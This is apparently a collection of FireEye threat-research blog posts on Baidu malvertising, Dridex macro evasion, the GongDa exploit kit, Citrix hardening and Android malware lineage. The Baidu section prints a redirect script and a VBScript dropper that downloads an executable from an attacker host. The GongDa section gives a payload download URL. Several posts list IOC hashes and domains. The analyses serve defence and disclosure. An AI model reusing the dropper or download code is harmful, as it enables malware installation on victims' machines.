    if (visit == 3) url =
    &quot;<b>hxxp://www.txiu[.]cc/index3.htm</b>&quot;;<br />      if
    (visit &gt;= 4) { url =
    &quot;<b>hxxp://www.ymnemh[.]info/index.htm</b>&quot;;<br />
                         <b>ResetCounts()</b>; }<br />      if(url !=
    &quot;&quot;) window.location = url;<br />  }<b>
      <br />  function ResetCounts() {<br />      var expdate = new
      Date();<br />      expdate.setTime(expdate.getTime() + (24 * 60 *
      60 * 1000 * 365));<br />      visit = 0;<br />     
      SetCookie(&quot;visit&quot;, visit, expdate, &quot;/&quot;, null, false);</b>
    <br />  }<br />  DisplayInfo();<br />  &lt;/script&gt;</span></p>
 <p>The highlighted part of <b>
    <i>Code Listing 1</i></b> is of main interest here. Every time the
  user lands on this web page, the browser is redirected to a certain
  set of infected pages for the same attack family until the user loops
  back to the same page – and it continues forever.</p>
 <h5>Deploying the attack iframe:</h5>
 <p>In the second part of the response, the first attack iframe is
  deployed, as seen in Figure 1:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%201.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. The first attack iframe (Remember the
    highlighted part)</span></p>
 <p>When the GET request for this iframe is generated, it feeds a
  compromised ad slot id to the standard ad API of Baidu using the API
  standard script <b>o.js</b>, as seen in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%202.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. The second attack iframe is being
    fetched from a compromised ad slot</span></p>
 <p>The script hxxp://cbjs.baidu[.]com/js/<b>o.js</b> generates the
  following request (Figure 3). The response is the second attack iframe
  (Figure 4):</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%203.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Notice the compromised ad slot 1xxxx78
    that is being utilized to fetch second iframe</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%204.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. The second attack iframe has been
    fetched from compromised ad slot 1xxxx78</span></p>
 <p>The second attack iframe <b>hxxp://p.jiayuepc[.]com/c.html?u=c6</b>
  has now been fetched in the above response from the compromised ad
  slot <b>1xxxx78</b>. This is the URL that gets the actual attack from
  the last compromised ad slot in this attack, i.e. <b>1xxxx80,</b> to
  fetch the actual attack script. The response to this URL can be seen
  in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%205.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. The second attack iframe
    hxxp://p.jiayuepc[.]com/c.html?u=c6 has requested attack body from
    the compromised ad slot 1xxxx80</span></p>
 <h5>Here comes the malicious code:<u></u>
  <b></b></h5>
 <p>Figure 6 shows the final request made to the ad server by the ad API
  script <b>o.js </b>using the compromised ad slot id.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%206.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Second attack iframe generates Baidu's
    ad API request fetching malicious VBScript from compromised ad slot</span></p>
 <p>Notice the underlined part of this automatically generated URL by
  o.js in Figure 6. ltu, ltr and lcr variables are assigned <b>first
    attack iframe URL</b> string, whereas liu is given the <b>second
    attack iframe URL</b> string. These will be utilized in dynamically
  altering the contents of the actual attack response – in this case,
  the name of the executable being dropped.</p>
 <p>The server responds with the encrypted attack masked inside the
  API’s response body. What is actually hiding inside is a VBScript that
  is dropped in <b>C:\Windows\Temp</b> with the name <b>logo.vbs</b>. It
  downloads and launches a malicious executable from a dedicated file
  server. The contents of this script are interesting, as shown
  highlighted in Code Listing 2.</p>
 <p>Set xPost=createObject(&quot;Microsoft.XMLHTTP&quot;)<br />
  xPost.Open
  &quot;GET&quot;,&quot;hxxp://co.lxxxxx98[.]com/logo.bmp?<b>1450263107531</b>&quot;,0<br />
  xPost.Send()<br /> set
  sGet=createObject(&quot;ADODB.Stream&quot;)<br /> sGet.Mode=3<br />
  sGet.Type=1<br /> sGet.Open()<br /> sGet.Write
  xPost.ResponseBody<br /> sGet.SaveToFile &quot;C:\Windows\Temp\logo_<b>c6-66pb_pic10</b>.exe&quot;,2</p>
 <p>
  <b>
    <i>Code Listing 2</i></b></p>
 <p>Here, <b>c6-66pb_pic10</b> is the name of the dropped executable
  that is derived from the iframe URLs that eventually lead to the
  attack slot, so this dynamically generated name is different for
  different redirection pathways, as shown in <b>
    <i>Figure 7</i></b>.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%207.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. Attack has been <u>dynamically
    altered</u> based on first and second iframe information which was
    sent to slot <u>1xxxx80</u></span></p>
 <p>A pseudorandom numeric token (in this case <b>1450263107531</b>, as
  highlighted in <b>
    <i>Code Listing 2</i></b>) is sent to the attack hosting server
  <b>co.lxxxxx98[.]com</b> along with the <b>logo.bmp</b> request (as
  highlighted in code line #2 in <b>
    <i>Code Listing 2</i></b>). The response is a polymorphic Trojan
  downloader executable that always has the same name, i.e. <b>logo.bmp</b>.</p>
 <p>In this case, the executable is from <b>a Trojan downloader family
    recognized by Microsoft as Win32/Jongiti</b>. As per the <a href=""http://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=TrojanDownloader:Win32/Jongiti"">Microsoft.com website</a>:</p>
 <p>
  <i>“This threat downloads and installs other programs onto your PC
    without your consent, including other malware.”</i></p>
 <h5>The infection continues:<u></u>
  <b></b></h5>
 <p>The attack doesn’t stop there. Another GET request to the same
  server hosting logo.bmp is generated, requesting a file named
  <b>c.ini</b>, as seen in Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%208.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. c.ini requested from the same server
    lxxxxx98[.]com that served the first binary as logo.bmp</span></p>
 <p>A list is returned in the response containing potentially unwanted
  programs (PUPs) and Trojan downloaders available for direct download,
  as shown in Figure 9.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%209.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9. c.ini lists downloadable executables
    returned in response to hxxp://pz.lxxxxx98[.]com/c.ini?1450263172</span></p>
 <p>The list from <b>c.ini</b> is then fed to
  <b>logo_c6-66pb_pic10.exe</b> as an argument, and one by one unwanted
  content – mostly PUPs, keyloggers and pornographic content droppers –
  are launched on the victim machine. Figure 10 shows this process.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baidu/Figure%2010.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10. logo_c6-66pb_pic10.exe downloads
    rag1446260.exe, which can download further unwanted content</span></p>
 <p>On systems running Windows, the latest versions of Internet Explorer
  (IE) will prompt against this malvertisement since, as of IE11,
  Microsoft stopped supporting execution of VBScript on the client side.
  Users who are currently running versions of IE that are older than
  11.0 can stay safe from these types of attacks by simply upgrading
  their browsers to IE11 or later.</p>
 <p>FireEye representatives contacted Baidu officials to responsibly
  disclose the issue. Baidu fully cooperated by taking immediate action
  against the attacking party and removing all malicious content. They
  also made immediate changes to their ad platform regulations so that
  certain dynamic behaviors such as loading VBScript or downloading
  executables from suspicious domains are no longer allowed.</p>
 <h5>
  <b>A shift to backup ad slots:</b></h5>
 <p>Though crippled due to its main ad slot content being removed, this
  malvertising campaign shifted to its backup ad slots. FireEye
  immediately communicated the details to Baidu and the issue was
  quickly addressed. At the time of posting, the campaign is no longer
  active. During the two-week wait period before FireEye made this post
  public, Baidu has been doing a massive search and clean operation on
  their ad slots. As per Baidu officials:</p>
 <ul> <li>From March 14 to March 18, evidence gathering from the
    attacker account was finalized and all their malicious content was
  cleaned.</li> <li>It is now mandatory for all existing and new
    accounts to bind and verify a cellphone number and domain name
    registration record (both have real-name enforcement in China) for
    verification. Account identities related to malicious content can be
    provided to the law enforcement agencies.</li> <li>Baidu has
    enhanced its detection mechanism to capture malicious content hosted
    on its ad platform. All existing uploaded content is also to be
    fully scanned.</li> </ul>
 <p>From March 21 to March 31, Baidu is in the process of shutting down
  the upload channel of user defined scripts and Flash to their ad
  platform. This means that similar malvertising campaigns can no longer
  host content on Baidu’s ad slots in the future.</p>",http://www.fireeye.com/blog/threat-research/2016/03/china-based_ad_giant.html
Stop Scanning My Macro,"<p>FireEye Labs detected an interesting evasion strategy in two recent,
  large Dridex campaigns. These campaigns changed the attachment
  file-type and location of malicious logic in an attempt to avoid scanners.</p>
 <h5>
  <b>Overview</b></h5>
 <p>Both campaigns used an invoice theme and came from a wide variety of
  sending addresses, with messages being sent to more than 40 countries
  across all industries, as seen in Figure 1 and Figure 2. The following
  subject lines were used:</p>
 <p>Invoice &lt;xxxx&gt; from Tip Top Delivery<br /> Urgent: IMAGINiT
  invoice &lt;xxxx&gt; is Past due</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Scan%20Macros/figure1.png"" />
  <span class=""type-XS"">Figure 1. Affected Countries</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Scan%20Macros/figure2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Affected Industries</span></p>
 <p>What made these two campaigns interesting was the major shift in the
  downloader techniques used to evade signature-based detection. The
  following are some of the key techniques that were used:</p>
 <ol> <li>Disguising WordprocessingML as RTF file to evade type specific
  signatures.</li> <li>Keeping the main malicious macro clean to avoid
    macro-based detection. The malicious VBA code was instead stored in
    TextBox objects located within the Forms, as seen in Figure 4.</li>
    <li>Dropping a VBE based downloader that could not be seen without
    execution of the malicious RTF file. This downloader would then
    download and execute the malicious payload.</li> </ol>
 <h5>
  <b>1.    Masquerading WordprocessingML as RTF file</b></h5>
 <p>While Dridex has traditionally been delivered using Excel, Word, or
  JavaScript files, these two large campaigns involved WordprocessingML
  (an XML format that is supported by Microsoft Word to describe a Word
  document) masquerading as RTF files. This seems to be a trend, as we
  saw a similar technique in previous campaigns where a DOCM file was
  disguised as RTF. Figure 3 shows a screenshot of the Tip Top campaign,
  set as high priority.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Scan%20Macros/figure4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Designed Campaign</span></p>
 <h5>
  <b>2.    Keeping the main macro clean</b></h5>
 <p>In the extracted macro, it is interesting to note that there is
  almost no malicious content that could trigger static detection. In
  fact, a majority of the key ingredients are stored in text boxes
  within created forms, shown in Figure 4.</p>
 <p>Using this, it defeats signature-based scanning, which tries to
  detect known malicious macro based on past knowledge. At the time of
  discovery, most of the samples that were observed were detected by
  only one out of 56 vendors on VirusTotal, which indicates that
  modifications made to these malicious documents was likely an effort
  to avoid detection.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Scan%20Macros/figure3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. Secret Macro</span></p>
 <h5>
  <b>3.    VBE Downloader</b></h5>
 <p>Once the malicious macro is launched, the Word document drops a
  malicious VB Encoded script in a temporary folder, as shown in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Scan%20Macros/figure5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Location of the VBE</span></p>
 <p>Based on our analysis, the VBE simply downloads Dridex from the
  malware server and installs it on infected machines, as shown in
  Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Scan%20Macros/figure6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Decoded VBE</span></p>
 <h5>
  <b>Signatures</b></h5>
 <p>The authors left Cyrillic strings in the XML, which could possibly
  be used as an IOC to hunt for similar documents.</p>
 <ul> <li>&lt;wx:uiName wx:val=&quot;Основной шрифт абзаца&quot;/&gt;
    (translates to &quot;The main text of the paragraph&quot;)</li>
    <li>&lt;wx:uiName wx:val=&quot;Обычная таблица&quot;/&gt;
    (translates to &quot;table Normal&quot;)</li> <li>&lt;wx:uiName
    wx:val=&quot;Нет списка&quot;/&gt; (translates to &quot;No
  List&quot;)</li>
  <li>&lt;o:LastAuthor&gt;павуваыва&lt;/o:LastAuthor&gt;</li> </ul>
 <h5>
  <b>Conclusion</b></h5>
 <p>Cybercriminals continue to innovate, this time demonstrating a
  creative way of making threats harder to detect using static
  signatures. To remain secure, it is important to stay vigilant and
  proactive in three key areas: user awareness, policy and technology.</p>
 <h5>
  <b>Indicators of Compromise</b></h5>
 <p>
  <b>1.     IMAGINiT campaign</b></p>
 <p>
  <b>MD5</b>
  <br /> 8840c20ac74281c0580e8637caf1edea<br />
  800f90f29d13716eb1f7059fb84089ed<br />
  7e74d5a3a20038fe0a66445eb76fa066<br />
  7a4b7762f8db2438b4ad3d991864431d<br />
  74f9da1ce1ff900113ae7cb28b3eb56f<br />
  6ccc678c3ec284fad015ed0eaa875733<br />
  3ea5c225132f0d7423417b3c7ce98c7d<br /> 33b2a2d98aca34b66de9a11b7ec2d951</p>
 <p>
  <b>Network Indicator</b>
  <br /> GET /michigan/map.php HTTP/1.1<br />
  house.nochildforgotten.org<br /> IGINV51905.rtf</p>
 <p>
  <b>2.     Tip Top Delivery campaign</b></p>
 <p>
  <b>MD5</b>
  <br /> 858451ad73050bda48e5470abd2643ac<br />
  aff54d68cbf6ac8611fe89cd9f0dc2de<br />
  876d081e8b474a3c1ac57cf435e330cb<br />
  d8eebe2a08fff86abd06ec94e8bdd165<br />
  8c07b9337deda3c589d50e4ff3aadcd6<br />
  73c7bf49caa0d1bd37053b99a986ebe8<br />
  770fede93cc4220a371569daed2a4bc1<br />
  5b7813105cf9ebccb46cf7e63a5a836d<br /> 8f787ddedbaa8af3f6a73d0c6cd4e33e</p>
 <p>
  <b>Network Indicator</b>
  <br /> GET /michigan/map.php HTTP/1.1<br />
  parts.woodwardcounselinginc.com<br /> Invoice_GIINV02514_from_tip_top_delivery.rtf</p>",http://www.fireeye.com/blog/threat-research/2016/03/stop_scanning_mymac.html
GongDa vs. Korean News,"<p>On Jan. 27, we observed visitors to a Korean news site being
  redirected to the GongDa Exploit Kit (EK), potentially exposing them
  to malware infection. We will be referring to this site as KNS.</p>
 <p>GongDa is an exploit kit that can compromise vulnerable endpoints by
  use of exploits, allowing harmful malware to be installed on the
  system. While GongDa is an older exploit kit that continues to use
  Java exploits, it has also been found delivering both Flash and
  VBScript exploits as well. Despite its shortcomings when compared to
  newer EK’s such as Angler or Neutrino, GongDa proves that old tricks
  (or vulnerabilities) can still work effectively.</p>
 <h5>
  <b>ATTACK CHAIN</b></h5>
 <p>The attack chain is no different than previous GongDa attacks we’ve
  seen in the past. A compromised page on the site loads a .js file that
  redirects to the EK’s landing page.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/GongDa/figure1.png"" />
  <span class=""type-XS"">Figure 1: GongDa EK attack chain</span></p>
 <p>Where the initial page is at the first highlighted request shown in
  Figure 1. The second request is the .js file jquery-1.3.2.min.js. It
  has script code injected at the bottom that loads an iframe to
  <b>sekielec[.]co[.]kr/m/et/ad.html</b>, the EK’s landing page as shown
  in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/GongDa/figure2.png"" />
  <span class=""type-XS"">Figure 2: Injected script in the .js leading to GongDa</span></p>
 <p>We observed a number of KNS owned pages loading the malicious .js
  redirecting to the GongDa landing page “/ad.html”.</p>
 <p>From here, “ad.html” loaded:</p>
 <p>sekielec.co.kr/m/et/swfobject.js<b>
    <br />  sekielec.co.kr/m/et/PnNxKk.html</b>
  <br /> sekielec.co.kr/m/et/jquery.js</p>
 <p>
  <b>EXPLOITS</b></p>
 <p>GongDa has been observed serving the following CVE exploits in
  recent attacks:</p>
 <p>2011-3544, 2011-2140, 2012-0507, 2012-1723, 2012-1889,<br />
  2012-4681, 2012-5076, 2013-0422, 2013-0634 and 2014-6332.</p>
 <p>In this particular attack, the landing page probes the target
  machine and selects an exploit page to deliver to the victim. The
  exploit page observed in this attack was<b>
    sekielec.co.kr/m/et/PnNxKk.html. </b>It<b> </b>attempts to trigger
  CVE-2014-6332, “Windows OLE Automation Array Remote Code Execution
  Vulnerability”. This is a vulnerability that was patched by Microsoft
  Security Bulletin <a href=""https://technet.microsoft.com/library/security/ms14-064"">MS14-064</a>
  in November of 2014. It is a commonly used and dangerous vulnerability
  that can give an attacker arbitrary command execution on a target system.</p>
 <p>The exploit page begins by reversing a string of script code used to
  start the exploitation process.</p>
 <p>Figure 3 shows the before:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/GongDa/figure3.PNG"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Reversed initiation code</span></p>
 <p>And Figure 4 shows the after:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/GongDa/figure4.PNG"" />
  <span class=""type-XS"">Figure 4: Initiation code</span></p>
 <p>A call to the <i>Create()</i> function leads to a function call to
  the trigger function <i>Over()</i>,<i> </i>which is shown in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/GongDa/figure5.png"" />
  <span class=""type-XS"">
    <br /> Figure 5: Trigger function <i>Over()</i></span></p>
 <p>The <i>Over()</i> function is responsible for setting up conditions
  and corrupting an OLE Automation array object, thus triggering the vulnerability.</p>
 <p>Once the vulnerability is triggered, the attacker code can execute
  commands on the system.</p>
 <p>Three variables are assigned, as shown in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/GongDa/figure6.PNG"" />
  <span class=""type-XS"">
    <br /> Figure 6: Command variables</span></p>
 <p>The first variable (<i>nburl</i>) is a URL to the attacker malware.
  The second variable (<i>nbExE</i>) is a randomly generated name for
  the malware that is placed on the system. The third variable
  (<i>nbnurl</i>) is simply the first variable enclosed in quotes.</p>
 <p>
  <i>nburl: http://smsforu.co.kr/RAD/stat/at.exe</i></p>
 <p>Finally, the attacker code uses these variables and executes the
  following commands, as shown in Figure 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/GongDa/figure7.PNG"" />
  <span class=""type-XS"">Figure 7: Command beginning</span></p>
 <p>The <i>nbnurl</i> and the <i>nbExE</i> variable are used in the
  execution of the commands shown in Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/GongDa/figure8.PNG"" />
  <span class=""type-XS"">Figure 8: Command ending</span></p>
 <p>The malicious file is placed in the “%SystemRoot%\system\” directory
  using the nbExE variable described above as a filename.</p>
 <h5>
  <b>PAYLOADS</b></h5>
 <p>During this GongDa attack we saw the payloads being served from a
  domain within Korea:</p>
 <p>
  <b>smsforu[.]co[.]kr</b></p>
 <p>With the following filename:</p>
 <p>
  <b>/rad/stat/at.exe</b></p>
 <p>In recent GongDa attacks, we’ve observed payloads such as backdoors,
  RATs, Trojans, and downloaders.</p>
 <p>Some of the MD5’s observed include the following:</p>
 <ul> <li>aac178f775588ca1d42c00d4d95604bd</li>
  <li>3d58f4b2008f6d87cab9166c09e513b5</li>
  <li>a18d1bce5618b23f592dae9133c25229</li>
  <li>40be7c9424c6c6de0d560d358a020a5c</li>
  <li>808e27fd120ade3ecfb2b21aeda8bc58</li>
  <li>ed751ce651d685100e00ed133e4e5018</li> </ul>
 <h5>
  <b>ADDITIONAL INFO</b></h5>
 <p>Attacks involving the GongDa Exploit Kit are not new and are fairly
  common in the APAC region. While it’s not the most cutting edge EK in
  the wild, it is still effective because many systems in the region
  seem to remain unpatched and defenseless against antiquated
  vulnerabilities such as those used by GongDa.</p>
 <p>Additionally, GongDa consistently leverages infrastructure hosted on
  one of China’s largest ISP’s, China Telecom, operators of AS4134.
  China Telecom hosts the domain 51yes[.]com, a web traffic statistics service.</p>
 <p>One of GongDa’s telltale behaviors is the use of stat counters,
  presumably for tracking the EK’s traffic and infection statistics. In
  this case they most always come from count<i>X</i>[.]51yes[.]com,
  based out of China. Figure 9 shows the GET requests for these stat counters.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/GongDa/figure9.png"" />
  <span class=""type-XS"">
    <br /> Figure 9: Stat counter request</span></p>
 <p>FireEye’s Dynamic Threat Intelligence shows that
  count7[.]51yes[.].com has been used in multiple GongDa EK attacks in
  January 2016 alone.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""221""><p>
          <b>Referering GongDa URL</b></p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>bose.co.kr/shop/img/click/ad1.html</p>
        <p>bose.co.kr/shop/img/click/as1.html</p>
        <p>bose.co.kr/shop/img/naver/ad.html</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>edresearch.co.kr/PEG/click/ad.html</p>
        <p>edresearch.co.kr/PEG/click1/ad.html</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>nstory.com/tmp/click/ad1.html</p>
        <p>nstory.com/vars/ad/ad1.html</p>
        <p>nstory.com/vars/cache/click/ad1.html</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>odbike.co.kr/w3c/cdn/ad1.html</p>
        <p>odbike.co.kr/shop/skin/click/ad1.html</p>
        <p>odbike.co.kr/shop/temp/click/ad1.html</p>
        <p>odbike.co.kr/w3c/cdn/ad1.html</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>poption.kr/gnu/cdn1/ad.html</p>
        <p>poption.kr/gnu/click/ad.html</p>
        <p>poption.kr/gnu/extend/ad/ad.html</p>
        <p>poption.kr/w3c/click/ad.html</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>sekielec.co.kr/m/et/ad.html</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>smsmaster.co.kr/docs/click1/ad.html</p>
        <p>smsmaster.co.kr/docs/click3/ad.html</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>www.poption.kr/gnu/js/click/ad.html</p> </td> </tr></tbody></table>
 <p>Checking other count<i>X</i>[.]51yes[.]com hits with GongDa
  referrer’s, we saw hundreds of domains affected by the GongDa EK activity.</p>
 <p>It is believed that the GongDa Exploit Kit has Chinese origins. The
  hypothesis is derived from capabilities, usage, and the infrastructure
  used to target various APAC region entities.</p>
 <p>Interestingly, the registrant for the sekielec.co[.]kr GongDa
  landing page domain, “rhhan AT sekihe.co[.]kr”, also registered a
  number of other domains that have been observed as being GongDa
  landing pages as well.</p>
 <h5>
  <b>CONCLUSION</b></h5>
 <p>With a name reminiscent of a creature straight out of <a href=""https://en.wikipedia.org/wiki/Monsterland_and_Monster_Island"">Monster
  Island</a>, GongDa may not be the new kid on the block; however, as
  demonstrated, it is still active and capable of wreaking havoc.
  Network defenders in the APAC region should be aware of this EK and
  take steps to ensure this “monster” never enters their network.</p>
 <h5>
  <b>ACKNOWLEDGEMENTS</b></h5>
 <p>The authors and FireEye Labs would like to thank Dan Perez for his
  contribution to this blog.</p>",http://www.fireeye.com/blog/threat-research/2016/03/gongda_vs_koreanne.html
Citrix XenApp and XenDesktop Hardening Guidance,"<h5>A Joint Whitepaper from Mandiant and Citrix</h5>
 <p>Throughout the course of <a href=""https://www.fireeye.com/content/fireeye-www/en_US/services/red-team-operations.html"">Mandiant’s
    Red Team</a> and <a href=""https://www.fireeye.com/content/fireeye-www/en_US/services/mandiant-incident-response.html"">Incident
  Response</a> engagements, we frequently identify a wide array of
  misconfigured technology solutions, including Citrix XenApp and XenDesktop.</p>
 <p>We often see attackers leveraging stolen credentials from third
  parties, accessing Citrix solutions, breaking out of published
  applications, accessing the underlying operating systems, and moving
  laterally to further compromise the environment. Our experience shows
  that attackers are increasingly using Citrix solutions to remotely
  access victim environments post-compromise, instead of using
  traditional backdoors, remote access tools, or other types of malware.
  Using a legitimate means of remote access enables attackers to blend
  in with other users and fly under the radar of security monitoring tools.</p>
 <p>Citrix provides extensive security hardening guidance and templates
  to their customers to mitigate the risk of these types of attacks. The
  guidance is contained in product-specific eDocs, Knowledge Base
  articles and detailed Common Criteria configurations. System
  administrators (a number of them wearing many hats and juggling
  multiple projects) may not have the time to review all of the
  hardening documentation available, so Mandiant and Citrix teamed up to
  provide guidance on the most significant risks posed to Citrix XenApp
  and XenDesktop implementations in a single white paper.</p>
 <p>This white paper covers risks and official Citrix hardening guidance
  for the following topics:</p>
 <ul> <li>Environment and Application Jailbreaking</li> <li>Network
    Boundary Jumping</li> <li>Authentication Weaknesses</li>
    <li>Authorization Weaknesses</li> <li>Inconsistent Defensive
  Measures</li> <li>Non-configured or Misconfigured Logging and
  Alerting</li> </ul>
 <p>
  <a href=""https://www.citrix.com/content/dam/citrix/en_us/documents/products-solutions/system-hardening-for-xenapp-and-xendesktop.pdf"" target=""_blank"">The white paper is available here.</a></p>",http://www.fireeye.com/blog/threat-research/2016/03/citrix_xenapp_andxe.html
"A Growing Number of Android Malware Families Believed to Have a Common
Origin: A Study Based on Binary Code","<h4>
  <b>Introduction</b></h4>
 <p>On Feb. 19, IBM XForce researchers released an intelligence report
    [<a href=""https://securityintelligence.com/android-malware-about-to-get-worse-gm-bot-source-code-leaked/"">1</a>]
  stating that the source code for GM Bot was leaked to a crimeware
  forum in December 2015. GM Bot is a sophisticated Android malware
  family that emerged in the Russian-speaking cybercrime underground in
  late 2014. IBM also claimed that several Android malware families
  recently described in the security community were actually variants of
  GM Bot, including Bankosy[<a href=""http://www.symantec.com/connect/blogs/androidbankosy-all-ears-voice-call-based-2fa"">2</a>],
  MazarBot[3], and the SlemBunk malware recently described by FireEye[<a href=""https://www.fireeye.com/blog/threat-research/2015/12/slembunk_an_evolvin.html"">4</a>,
    <a href=""https://www.fireeye.com/blog/threat-research/2016/01/slembunk-part-two.html"">5</a>].</p>
 <p>Security vendors may differ in their definition of a malware
  “variant.” The term may refer to anything from almost identical code
  with slight modifications, to code that has superficial similarities
  (such as similar network traffic) yet is otherwise very different.</p>
 <p>Using IBM’s reporting, we compared their GM Bot samples to SlemBunk.
  Based on the disassembled code of these two families, we agree that
  there are enough code similarities to indicate that GM Bot shares a
  common origin with SlemBunk. Interestingly, our research led us to
  identify an earlier malware family named SimpleLocker – the first
  known file-encryption ransomware on Android [<a href=""http://www.welivesecurity.com/2014/06/04/simplocker/"">6</a>] –
  that also shares a common origin with these banking trojan families.</p>
 <h5>
  <b>GM Bot and SlemBunk</b></h5>
 <p>Our analysis showed that the four GM Bot samples referenced by IBM
  researchers all share the same major components as SlemBunk. Figure 1
  of our earlier report [<a href=""https://www.fireeye.com/blog/threat-research/2015/12/slembunk_an_evolvin.html"">4</a>]
  is reproduced here, which shows the major components of SlemBunk and
  its corresponding class names:</p>
 <ul> <li>
    <b>
      <i>ServiceStarter</i></b>: An Android receiver that will be
    invoked once an app is launched or the device boots up. Its
    functionality is to start the monitoring
    service, <i>MainService</i>, in the background.</li> <li>
    <b>
      <i>MainService</i></b>: An Android service that runs in the
    background and monitors all running processes on the device. It
    prompts the user with an overlay view that resembles the legitimate
    app when that app is launched. This monitoring service also
    communicates with a remote host by sending the initial device data
    and notifying of device status and app preferences.</li> <li>
    <b>
      <i>MessageReceiver</i></b>: An Android receiver that handles
    incoming text messages. In addition to the functionality of
    intercepting the authentication code from the bank, this component
    also acts as the bot client for remote command and control
  (C2).</li> <li>
    <b>
      <i>MyDeviceAdminReceiver</i></b>: A receiver that requests
    administrator access to the Android device the first time the app is
    launched. This makes the app more difficult to remove.</li> <li>
    <b>Customized UI views:</b> Activity classes that present fake login
    pages that mimic those of the real banking apps or social apps to
    phish for banking or social account credentials.</li> </ul>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Android%20Malware%20Wu/Figure1.png"" />
  <span class=""type-XS"">Figure 1. Major components of SlemBunk malware family</span></p>
 <p>The first three GM Bot samples have the same package name as our
  SlemBunk sample. In addition, the GM Bot samples have five of the same
  major components, including the same component names, as the SlemBunk
  sample in Figure 1.</p>
 <p>The fourth GM Bot sample has a different initial package name, but
  unpacks the real payload at runtime. The unpacked payload has the same
  major components as the SlemBunk sample, with a few minor changes on
  the class names: <i>MessageReceiver </i>replaced with<i>
  buziabuzia</i>, and <i>MyDeviceAdminReceiver</i> replaced with <i>MDRA</i>.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Android%20Malware%20Wu/Figure2.png"" />
  <span class=""type-XS"">Figure 2. Code Structure Comparison between GM
    Bot and SlemBunk</span></p>
 <p>Figure 2 shows the code structure similarity between one GM Bot
  sample and one SlemBunk sample (SHA256
  9425fca578661392f3b12e1f1d83b8307bfb94340ae797c2f121d365852a775e and
  SHA256
  e072a7a8d8e5a562342121408493937ecdedf6f357b1687e6da257f40d0c6b27 for
  GM Bot and SlemBunk, respectively). From this figure, we can see that
  the five major components we discussed in our previous post [<a href=""https://www.fireeye.com/blog/threat-research/2015/12/slembunk_an_evolvin.html"">4</a>]
  are also present in GM Bot sample. Other common classes include:</p>
 <ul> <li>
    <b>
      <i>Main</i></b>, the launching activity of both samples.</li> <li>
    <b>
      <i>MyApplication</i></b>, the application class that starts before
    any other activities of both samples.</li> <li>
    <b>
      <i>SDCardServiceStarter</i></b>, another receiver that monitors
    the status of MainService and restarts it when it dies.</li> </ul>
 <p>Among all the above components and classes, <i>MainService</i> is
  the most critical one. It is started by class <i>Main</i> at the
  launching time, keeps working in the background to monitor the top
  running process, and overlays a phishing view when a victim app (e.g.,
